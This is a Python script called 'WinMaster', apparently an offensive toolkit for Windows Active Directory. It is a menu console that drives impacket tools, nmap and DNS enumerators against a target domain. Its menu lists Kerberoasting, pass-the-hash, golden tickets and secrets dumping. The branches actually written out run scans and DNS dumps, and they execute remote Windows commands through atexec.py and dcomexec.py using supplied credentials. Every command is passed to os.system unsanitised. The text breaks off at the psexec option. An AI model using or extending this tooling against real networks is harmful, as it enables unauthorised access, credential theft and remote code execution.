#!/usr/bin/python3
# coding:UTF-8

# -------------------------------------------------------------------------------------
#               PYTHON SCRIPT FILE FOR THE FORENSIC ANALYSIS OF NETWORKS
#         BY TERENCE BROADBENT MSc DIGITAL FORENSICS AND CYBERCRIME ANALYSIS
# -------------------------------------------------------------------------------------

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0                                                                
# Details : Load required imports.
# Modified: N/A
# -------------------------------------------------------------------------------------

import os
import sys
import shutil
import os.path
import hashlib
import binascii
import datetime
import fileinput
import linecache
import subprocess
from termcolor import colored					# pip install termcolor

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : 1.0                                                                
# Details : Conduct simple and routine tests on user supplied arguements.   
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

if os.geteuid() != 0:
    print("\nPlease run this python3 script as root...")
    exit(True)

if len(sys.argv) < 3:
    print("\nUse the command python3 WinMaster.py neo4j password\n")
    exit(True)

BH1 = sys.argv[1]	# NEO4J USERNAME
BH2 = sys.argv[2]	# NEO4J PASSWORD
BUG = 0			# DEBUG = 1

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : 1.0
# Details : Create function calls from main.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

def padding(variable,value):
   variable = variable.rstrip("\n")
   variable = variable[:value] 
   while len(variable) < value:
      variable += " "
   return variable

def rpadding(variable,value):
   variable = variable.rstrip("\n")
   while len(variable) < value:
      temp = variable
      variable = "." + temp
   return variable

def dpadding(variable,value):
   test = variable
   variable = variable.rstrip("\n")
   variable = variable[:value] 
   while len(variable) < value:
      if test == "":
         variable += " "
      else:
         variable += "."
   return variable

def gettime(value):
   variable = str(datetime.datetime.now().time())
   variable = variable.split(".")
   variable = variable[0]
   variable = variable.split(":")
   variable = variable[0] + ":" + variable[1]
   variable = padding(variable, value)
   return variable

def command(command):
   if BUG == 1:
      print(colored(command, 'white'))
   os.system(command)
   return

def prompt():
   selection = input("\nPress ENTER to continue...")
   return

def display():
   print('\u2554' + ('\u2550')*36 + '\u2566' + ('\u2550')*33 + '\u2566' + ('\u2550')*61 + '\u2557')
   print('\u2551' + (" ")*12 + colored("REMOTE SYSTEM",'white') +  (" ")*11 + '\u2551' + (" ")*10 + colored("SYSTEM SHARES",'white') + (" ")*10 + '\u2551' + (" ")*21 +  colored("USER INFORMATION",'white') + (" ")*24 + '\u2551') 
   print('\u2560' + ('\u2550')*14 + '\u2564' + ('\u2550')*21 + '\u256C' + ('\u2550')*12 + '\u2550' + ('\u2550')*20 + '\u256C' + ('\u2550')*61 + '\u2563')

   print('\u2551' + " DNS SERVER   " + '\u2502', end=' ')
   if DNSN == "EMPTY              ":
      print(colored(DNSN[:COL1],'yellow'), end=' ')
   else:
      print(colored(DNSN[:COL1],'blue'), end=' ')
   print('\u2551', end=' ')
   print(colored(SH0,'blue'), end=' ')
   print(colored(SHA0,'blue'), end=' ')
   print('\u2551', end=' ')
   print(colored(US[0],'blue'), end=' ')
   print(colored(PA[0],'blue'), end=' ')
   print('\u2551')

   print('\u2551' + " REMOTE IP    " + '\u2502', end=' ')
   if TIP == "EMPTY              ":
      print(colored(TIP[:COL1],'yellow'), end=' ')
   else:
      print(colored(TIP[:COL1],'blue'), end=' ')
   print('\u2551', end=' ')
   print(colored(SH1,'blue'), end=' ')
   print(colored(SHA1,'blue'), end=' ')
   print('\u2551', end=' ')
   print(colored(US[1],'blue'), end=' ')
   print(colored(PA[1],'blue'), end=' ')
   print('\u2551')

   print('\u2551' + " USERNAME     " + '\u2502', end=' ')
   if USR == '""                 ':
      print(colored(USR[:COL1],'yellow'), end=' ')
   else:
      print(colored(USR[:COL1],'blue'), end=' ')
   print('\u2551', end=' ')
   print(colored(SH2,'blue'), end=' ')
   print(colored(SHA2,'blue'), end=' ')
   print('\u2551', end=' ')
   print(colored(US[2],'blue'), end=' ')
   print(colored(PA[2],'blue'), end=' ')
   print('\u2551')
   
   print('\u2551' + " PASSWORD     " + '\u2502', end=' ')
   if PAS == '""                 ':
      print(colored(PAS[:COL1],'yellow'), end=' ')
   else:
      print(colored(PAS[:COL1],'blue'), end=' ')
   print('\u2551', end=' ')
   print(colored(SH3,'blue'), end=' ')
   print(colored(SHA3,'blue'), end=' ')
   print('\u2551', end=' ')
   print(colored(US[3],'blue'), end=' ')
   print(colored(PA[3],'blue'), end=' ')
   print('\u2551')

   print('\u2551' + " NTLM HASH    " + '\u2502', end=' ')
   if FRST == "EMPTY              ":
      print(colored(FRST[:COL1],'yellow'), end=' ')
   else:
      print(colored(FRST[:COL1],'red'), end=' ')
   print('\u2551', end=' ')
   print(colored(SH4,'blue'), end=' ')
   print(colored(SHA4,'blue'), end=' ')
   print('\u2551', end=' ')
   print(colored(US[4],'blue'), end=' ')
   print(colored(PA[4],'blue'), end=' ')
   print('\u2551')
   
   print('\u2551' + " DOMAIN NAME  " + '\u2502', end=' ')
   if HST == "EMPTY              ":
      print(colored(HST[:COL1],'yellow'), end=' ')
   else:
      print(colored(HST[:COL1],'blue'), end=' ')
   print('\u2551', end=' ')
   print(colored(SH5,'blue'), end=' ')
   print(colored(SHA5,'blue'), end=' ')
   print('\u2551', end=' ')
   print(colored(US[5],'blue'), end=' ')
   print(colored(PA[5],'blue'), end=' ')
   print('\u2551')

   print('\u2551' + " DOMAIN SID   " + '\u2502', end=' ')
   if WGRP == "EMPTY              ":
      print(colored(WGRP[:COL1],'yellow'), end=' ')
   else:
      print(colored(WGRP[:COL1],'red'), end=' ')
   print('\u2551', end=' ')
   print(colored(SH6,'blue'), end=' ')
   print(colored(SHA6,'blue'), end=' ')
   print('\u2551', end=' ')
   print(colored(US[6],'blue'), end=' ')
   print(colored(PA[6],'blue'), end=' ')
   print('\u2551')
     
   print('\u2551' + " SHARE NAME   " + '\u2502', end=' ')
   if HIP == "EMPTY              ":
      print(colored(HIP[:COL1],'yellow'), end=' ')
   else:
      print(colored(HIP[:COL1],'blue'), end=' ')
   print('\u2551', end=' ')
   print(colored(SH7,'blue'), end=' ')
   print(colored(SHA7,'blue'), end=' ')
   print('\u2551', end=' ')
   print(colored(US[7],'blue'), end=' ')
   print(colored(PA[7],'blue'), end=' ')
   print('\u2551')
   
   print('\u2551' + " IMPERSONATE  " + '\u2502', end=' ')
   if POR == "Administrator      ":
      print(colored(POR[:COL1],'yellow'), end=' ')
   else:
      print(colored(POR[:COL1],'blue'), end=' ')
   print('\u2551', end=' ')
   print(colored(SH8,'blue'), end=' ')
   print(colored(SHA8,'blue'), end=' ')
   print('\u2551', end=' ')
   print(colored(US[8],'blue'), end=' ')
   print(colored(PA[8],'blue'), end=' ')
   print('\u2551')
      
   print('\u2551' + " WIN COMMAND  " + '\u2502', end=' ')
   if PRM == "'dir -FORCE'       ":
      print(colored(PRM[:COL1],'yellow'), end=' ')
   else:
      print(colored(PRM[:COL1],'blue'), end=' ')
   print('\u2551', end=' ')
   print(colored(SH9,'blue'), end=' ')
   print(colored(SHA9,'blue'), end=' ')
   print('\u2551', end=' ')
   print(colored(US[9],'blue'), end=' ')
   print(colored(PA[9],'blue'), end=' ')
   print('\u2551')

   print('\u2551' + " CURRENT TIME " + '\u2502', end=' ')
   if SKEW == 0:
      print(colored(PI1[:COL1],'yellow'), end=' ')
   else:
      print(colored(PI1[:COL1],'blue'), end=' ')
   print('\u2551', end=' ')
   print(colored(SH10,'blue'), end=' ')
   print(colored(SHA10,'blue'), end=' ')
   print('\u2551', end=' ')
   print(colored(US[10],'blue'), end=' ')
   print(colored(PA[10],'blue'), end=' ')
   print('\u2551')
   
   print('\u2551' + " MY DIRECTORY " + '\u2502', end=' ')
   if DIR == "WORKAREA           ":
      print(colored(DIR[:COL1],'yellow'), end=' ')
   else:
      print(colored(DIR[:COL1],'blue'), end=' ')
   print('\u2551', end=' ')
   print(colored(SH11,'blue'), end=' ')
   print(colored(SHA11,'blue'), end=' ')
   print('\u2551', end=' ')
   if US[11] == "Some users are not shown!!":
      print(colored(US[11],'red'), end=' ')
   else:
      print(colored(US[11],'blue'), end=' ')
   print(colored(PA[11],'blue'), end=' ')
   print('\u2551')

   print('\u2560' + ('\u2550')*14 + '\u2567'+ ('\u2550')*21  + '\u2569' + ('\u2550')*12 + '\u2550' + ('\u2550')*20 + '\u2569' + ('\u2550')*61 + '\u2563')

# ----------------------------------------------------------------------------------------------------------------------------------------------------

   print('\u2551' + "(0) Save/Exit          (10) Re/Set WIN COMMAND (20) Get Arch (30) Enum4Linux     (40) Kerb Users Info (50) Golden PAC   (60) FTP    " + '\u2551')
   print('\u2551' + "(1) Re/Set DNS SERVER  (11) Re/Set CLOCK TIME  (21) Net View (31) WinDap Search  (41) Kerb Filter     (51) Domain Dump  (61) SSH    " + '\u2551')
   print('\u2551' + "(2) Re/Set REMOTE IP   (12) Re/Set DIRECTORY   (22) Services (32) Lookup Sids    (42) Kerb Bruteforce (52) Blood Hound  (62) TelNet " + '\u2551')
   print('\u2551' + "(3) Re/Set USERNAME    (13) Check Connection   (23) AtExec   (33) Sam Dump Users (43) Kerb Roasting   (53) BH ACLPwn    (63) NetCat " + '\u2551')
   print('\u2551' + "(4) Re/Set PASSWORD    (14) Check DNS Records  (24) DcomExec (34) Rpc Dump       (44) Kerb ASREPRoast (54) Secrets Dump (64) WinRM  " + '\u2551')
   print('\u2551' + "(5) Re/Set NTLM HASH   (15) Check DNS SERVER   (25) PsExec   (35) REGistery      (45) PASSWORD2HASH   (55) CrackMapExec (65) Desktop" + '\u2551')
   print('\u2551' + "(6) Re/Set DOMAIN NAME (16) Nmap O/S + Skew    (26) SmbExec  (36) Smb Client     (46) Pass the Hash   (56) PsExec HASH  (66)        " + '\u2551')
   print('\u2551' + "(7) Re/Set DOMAIN SID  (17) Nmap Subdomains    (27) WmiExec  (37) SmbMap SHARE   (47) Pass the Ticket (57) SmbExec HASH (67)        " + '\u2551')
   print('\u2551' + "(8) Re/Set SHARE NAME  (18) Nmap Intense TCP   (28) IfMap    (38) SmbMount SHARE (48) Silver Ticket   (58) WmiExec HASH (68)        " + '\u2551')
   print('\u2551' + "(9) Re/Set IMPERSONATE (19) Nmap Slow and Full (29) OpDump   (39) Rpc Client     (49) Golden Ticket   (59) Gen Userlist (69)        " + '\u2551')
   print('\u255A' + ('\u2550')*132 + '\u255D')

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence BroadbentAdres                                                    
# CONTRACT: GitHub
# Version : 1.0                                                                
# Details : Display universal header.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

command("clear")
print("__        _____ _   _   __  __    _    ____ _____ _____ ____      ") 
print("\ \      / /_ _| \ | | |  \/  |  / \  / ___|_   _| ____|  _ \     ") 
print(" \ \ /\ / / | ||  \| | | |\/| | / _ \ \___ \ | | |  _| | |_) |    ") 
print("  \ V  V /  | || |\  | | |  | |/ ___ \ ___) || | | |___|  _ <     ") 
print("   \_/\_/  |___|_| \_| |_|  |_/_/   \_\____/ |_| |_____|_| \_\    ")
print("                                                                  ")
print("BY TERENCE BROADBENT MSc DIGITAL FORENSICS & CYBERCRIME ANALYSIS\n")

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : 1.0
# Details : Boot the system and initialise program files and variables.
# Modified: N/A                                                               
# -------------------------------------------------------------------------------------

print("[+] Booting - Please wait...\n")

if not os.path.exists("WORKAREA"):		# DEFUALT WORKAREA
   os.mkdir("WORKAREA")
   print("[-] Work area created...")
else:
   print("[-] Work area already exists...")

if not os.path.exists("USERS.tmp"):		# HOLDS INITIAL USERS DATA
   command("touch USERS.tmp")
   print("[-] File USERS.tmp created...")
else:
   print("[-] File USERS.tmp already exists...")

if not os.path.exists("users.txt"):		# HOLDS CURRENT FILTERED USER LIST
   command("touch users.txt")
   print("[-] File users.txt created...")
else:
   print("[-] File users.txt already exists...")

if not os.path.exists("SHARES.tmp"):		# HOLDS INITIAL SHARE DATA
   command("touch SHARES.tmp")
   print("[-] File SHARES.tmp created...")
else:
   print("[-] File SHARES.tmp already exists...")

if not os.path.exists("SECRETS.tmp"):		# HOLDS INITIAL SECRETS DATA
   command("touch SECRETS.tmp")
   print("[-] File SECRETS.tmp created...")
else:
   print("[-] File SECRETS.tmp already exists...")

print("[-] Populating system variables...")

COL1 = 19
COL2 = 31
COL3 = 26
COL4 = 32
COL5 = 15

PRO  = "/usr/share/doc/python3-impacket/examples/" # IMPACKET LOCATION
LIP  = "10.10.10.xxx       " # LOCAL IP
SKEW = 0                     # TIME ADJUSTED

SH0  = " "*COL5 # SHARE
SH1  = " "*COL5 # SHARE 
SH2  = " "*COL5 # SHARE
SH3  = " "*COL5 # SHARE
SH4  = " "*COL5 # SHARE
SH5  = " "*COL5 # SHARE
SH6  = " "*COL5 # SHARE
SH7  = " "*COL5 # SHARE
SH8  = " "*COL5 # SHARE
SH9  = " "*COL5 # SHARE
SH10 = " "*COL5 # SHARE 
SH11 = " "*COL5 # SHARE

SHA0  = " "*COL5 # SHARE ATTRIBUTE
SHA1  = " "*COL5 # SHARE ATTRIBUTE
SHA2  = " "*COL5 # SHARE ATTRIBUTE
SHA3  = " "*COL5 # SHARE ATTRIBUTE
SHA4  = " "*COL5 # SHARE ATTRIBUTE
SHA5  = " "*COL5 # SHARE ATTRIBUTE
SHA6  = " "*COL5 # SHARE ATTRIBUTE
SHA7  = " "*COL5 # SHARE ATTRIBUTE
SHA8  = " "*COL5 # SHARE ATTRIBUTE
SHA9  = " "*COL5 # SHARE ATTRIBUTE
SHA10 = " "*COL5 # SHARE ATTRIBUTE
SHA11 = " "*COL5 # SHARE ATTRIBUTE


X1   = " "*COL3
X2   = " "*COL4
US   = []
PA   = []
US   = [X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1] # 40 USERNAMES
PA   = [X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2] # 40 PASSWORDS

MAX  = 39
ADD  = 0
ADD2 = 0

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : 1.0
# Details : Check the config file for stored variables.
# Modified: N/A                                                               	
# -------------------------------------------------------------------------------------

if not os.path.exists('config.txt'):
   print("[-] Configuration file not found - using defualt values...")
   DNSN = "EMPTY              " # DNS NAME
   TIP  = "EMPTY              " # REMOTE IP
   USR  = '""                 ' # USERNAME
   PAS  = '""                 ' # PASSWORD       
   FRST = "EMPTY              " # NTML HASH
   HST  = "EMPTY              " # DOMAIN NAME
   WGRP = "EMPTY              " # DOMAIN SID
   HIP  = "EMPTY              " # CURRENT SHARE
   POR  = "Administrator      " # IMPERSONATE
   PRM  = "'dir -FORCE'       " # WIN COMMAND                                            
   PI1  = "00:00              " # LOCAL TIME    
   DIR  = "WORKAREA           " # DIRECTORY
else:
   print("[-] Configuration file found - restoring saved data....")
   DNSN = linecache.getline('config.txt', 1)
   TIP  = linecache.getline('config.txt', 2)
   USR  = linecache.getline('config.txt', 3)
   PAS  = linecache.getline('config.txt', 4)
   FRST = linecache.getline('config.txt', 5)
   HST  = linecache.getline('config.txt', 6)
   WGRP = linecache.getline('config.txt', 7)
   HIP  = linecache.getline('config.txt', 8)
   POR  = linecache.getline('config.txt', 9)
   PRM  = linecache.getline('config.txt', 10)
   PI1  = linecache.getline('config.txt', 11)
   DIR  = linecache.getline('config.txt', 12)

   DNSN = padding(DNSN, COL1)
   TIP  = padding(TIP,  COL1)
   USR  = padding(USR,  COL1)
   PAS  = padding(PAS,  COL1)
   if FRST[:5] == "EMPTY":
      FRST = padding(FRST, COL1)
   HST  = padding(HST,  COL1)
   if WGRP[:5] == "EMPTY":
       WGRP = padding(WGRP, COL1)
   HIP  = padding(HIP,  COL1)
   POR  = padding(POR,  COL1)
   PRM  = padding(PRM,  COL1)
   PI1  = padding(PI1,  COL1)
   DIR  = padding(DIR,  COL1)

print("[*] Starting neo4j database...")

command("touch log.txt")
command("neo4j start   >> log.txt 2>&1")
command("neo4j console >> log.txt 2>&1")
os.remove("log.txt")

input("\nPlease ENTER key to continue...")

# -------------------------------------------------------------------------------------
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub                                                               
# Version : 1.0
# Details : Start the main menu controller.
# Modified: N/A                                                               	
# -------------------------------------------------------------------------------------

while True: 
   command("clear")
   PI1 = gettime(COL1)
   display()
   selection=input("Please Select: ")

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - Save current data to config.txt and exit the program.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '0':
      command("echo " + DNSN + " > config.txt")
      command("echo " + TIP  + " >> config.txt")
      if USR.rstrip(" ") == "\"\"":
         command("echo '\"\"' >> config.txt")
      else:
         command("echo " + USR  + " >> config.txt")     
      if PAS.rstrip(" ") == "\"\"":
         command("echo '\"\"' >> config.txt")
      else:
         command("echo " + PAS  + " >> config.txt")
      command("echo " + FRST.rstrip("\n") + " >> config.txt") 
      command("echo " + HST  + " >> config.txt")  
      command("echo " + WGRP.rstrip("\n") + " >> config.txt")
      command("echo " + HIP  + " >> config.txt")  
      command("echo " + POR  + " >> config.txt")  
      tmp = '\"' + PRM.rstrip(" ") + '\"'
      command("echo " + tmp + " >> config.txt")  
      command("echo " + PI1  + " >> config.txt")  
      command("echo " + DIR  + " >> config.txt")  
      
      os.remove("SECRETS.tmp")
      os.remove("SHARES.tmp")
      os.remove("USERS.tmp")
      os.remove("users.txt")

      exit(1)

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - Change remote DNS SERVER name.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='1':
      BAK = DNSN
      DNSN = input("\nPlease enter DNS SERVER name: ")
      if DNSN != "":
         if len(DNSN) < COL1:
            DNSN = padding(DNSN, COL1)
         command("echo '" + TIP.rstrip(" ") + "\t" + DNSN.rstrip(" ") + "' >> /etc/hosts")
         print("DNS SERVER " + DNSN.rstrip(" ") + " has been added to /etc/hosts...")
         prompt()
      else:
         DNSN = BAK      

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - Change remote IP address.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='2':
      BAK = TIP
      TIP = input("\nPlease enter REMOTE IP address: ")
      if TIP != "":
         if len(TIP) < COL1:
            TIP = padding(TIP, COL1)
      else:
         TIP = BAK      

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - Change the current USER.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '3':
      BAK = USR
      USR = input("\nPlease enter USERNAME: ")
      if USR != "":
         if len(USR) < COL1:
            USR = padding(USR, COL1)
         for a in range(0, MAX):
            if US[a].rstrip(" ") == USR.rstrip(" "):
               FRST = PA[a]	# UPDATE HASH VALUE TO MATCH USER.
      else:
         USR = BAK

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - Change the current USERS PASSWORD.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '4':
      BAK = PAS
      PAS = input("\nPlease enter PASSWORD: ")
      if PAS != "":
         if len(PAS) < COL1:
            PAS = padding(PAS, COL1)
      else:
         PAS = BAK

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - Change the current USERS HASH value.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '5':
      BAK = FRST
      FRST = input("\nPlease enter HASH value: ")
      if FRST != "":
         if len(FRST) < COL1:
            FRST = padding(FRST, COL1)
      else:
         FRST = BAK

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - Change the remote DOMAIN name.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '6':
      BAK = HST
      HST = input("\nPlease enter DOMAIN name: ")
      if HST != "":
         if len(HST) < COL1:
            HST = padding(HST, COL1)
         command("echo '" + TIP.rstrip(" ") + "\t" + HST.rstrip(" ") + "' >> /etc/hosts")
         print("DOMAIN " + HST.rstrip(" ") + " has been added to /etc/hosts...")
         prompt()
      else:
         HST = BAK      

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - Change the remote DOMAIN SID value.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '7':
      BAK = WGRP
      WGRP = input("\nPlease enter DOMAIN SID value: ")
      if WGRP != "":
         if len(WGRP) < COL1:
            WGRP = padding(WGRP, COL1)
      else:
         WGRP = BAK

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - Change the remote SHARE name.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '8':
      BAK = HIP
      HIP = input("\nPlease enter SHARE name: ")
      if HIP != "":
         if len(HIP) < COL1:
            HIP = padding(HIP,COL1)
      else:
         HIP = BAK

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                           
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - Change the remote Windows USER to impersonate.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '9':
      BAK = POR
      POR = input("\nPlease enter IMPERSONATOR name: ")
      if POR != "":
         if len(POR) < COL1:
            POR = padding(POR, COL1)
      else:
         POR = BAK

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                           
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - Change the remote windows COMMAND.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '10':
      BAK = PRM
      PRM = input("\nPlease enter Windows COMMAND: ")
      if PRM != "":
         if len(PRM) < COL1:
            PRM = padding(PRM, COL1)
      else:
         PRM = BAK

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                           
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - Reset local TIME to match kerberos skew. 
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '11':
      BAK = PI1
      PI1 = input("\nPlease enter computer TIME: ")
      if PI1 != "":
         command("date --set=" + PI1)
         PI1 = padding(PI1, COL1)
         SKEW = 1
      else:
         PI1 = BAK      
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - Change local working DIRECTORY.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '12':
      directory = input("\nPlease enter new working DIRECTORY: ")
      if os.path.exists(directory):
         print("Directory already exists....")
      else:
         if len(directory) > 0:
            os.mkdir(directory)
            DIR = directory
            if len(DIR) < COL1:
               DIR = padding(DIR, COL1)
            print("Working directory changed...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - Ping localhost IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '13':
      if TIP[:5] != "EMPTY":
         command("hostname -I > localip.txt")
         localhost = linecache.getline('localip.txt', 1)
         os.remove("localip.txt")
         localhost = localhost.split(" ")
         localhost = localhost[1]
         command(PRO + "ping.py " + localhost.rstrip(" ") +  " " + TIP.rstrip(" "))
      else:
         print("Remote IP address not specified...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - adidnsdump -u DOMAIN\USER -p PASSWORD DOMAIN --include-tombstoned -r
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '14':
      if (HST[:5] == "EMPTY"):
         print("Domain name not specified...")
      if (USR[:2] == '""'):
         print("User name not specified...")
      if (PAS[:2] == '""'): 
         print("Password not specified...")
      else:
         command("adidnsdump -u '" + HST.rstrip(" ") + "\\" + USR.rstrip(" ") + "' -p " + PAS.rstrip(" ") + " " + HST.rstrip(" ") + " --include-tombstoned -r")
         command("sed -i '1d' records.csv")
         command("\ncat records.csv")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - fierce -dns DNS SERVER.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '15':
      if DNSN[:5] != "EMPTY":
         command("fierce -dns " + DNSN.rstrip(" "))
      else:
         print("DNS Server not specified...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - nmap -sU -O -p 123 --script ntp-info IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '16':
      if TIP[:5] != "EMPTY":
         command("nmap -sU -O -p 123 --script ntp-info " + TIP.rstrip(" "))
      else:
         print("Remote IP address not specified...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - nmap -p 80 --script http-vhosts --script-args http-vhosts.domain=DOMAIN IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '17':
      if (HST[:5] != "EMPTY") & (TIP[:5] != "EMPTY"):
         command("nmap -p 80 --script http-vhosts --script-args http-vhosts.domain=" + HST.rstrip(" ") + " " + TIP.rstrip(" "))
      else:
         print("Domain name or remote IP address not specified...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - Intense quick TCP scan.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '18':
      if TIP[:5] != "EMPTY":
         command("nmap -T4 -F " + TIP.rstrip(" "))
      else:
         print("Remote IP address not specified...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - Full, slow and comprehensive nmap scan.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '19':
      if TIP[:5] != "EMPTY":
         command("nmap -sS -sU -T4 -A -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 --script 'default or (discovery and safe)' " + TIP.rstrip(" "))
      else:
         print("Remote IP address not specified...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - getArch.py -target IP
# Details : 32/64 bit
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '20':
      command(PRO + "getArch.py -target " + TIP.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - netview.py DOMAIM/USER:PASSWORD -target IP
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='21':
      command(PRO + "netview.py " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + " -target " + TIP.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - services.py USER:PASSWOrd@IP list.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='22':
      command(PRO + "services.py " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " list")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - atexec.py DOMAIN/USER:PASSWORD@IP WIN COMMAND.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '23':
      command(PRO + "atexec.py " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " " + PRM.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - dcomexec.py DOMAIN/USER:PASSWORD@IP WIN COMMAND.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '24':
      command(PRO + "dcomexec.py " + HST.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" ") + " " + PRM.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : 1.0
# Details : Menu option selected - psexec.py DOMAIN/USER:PASSWORD@IP cmd.exe.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '25':
      os.remove("SHARES.tmp")
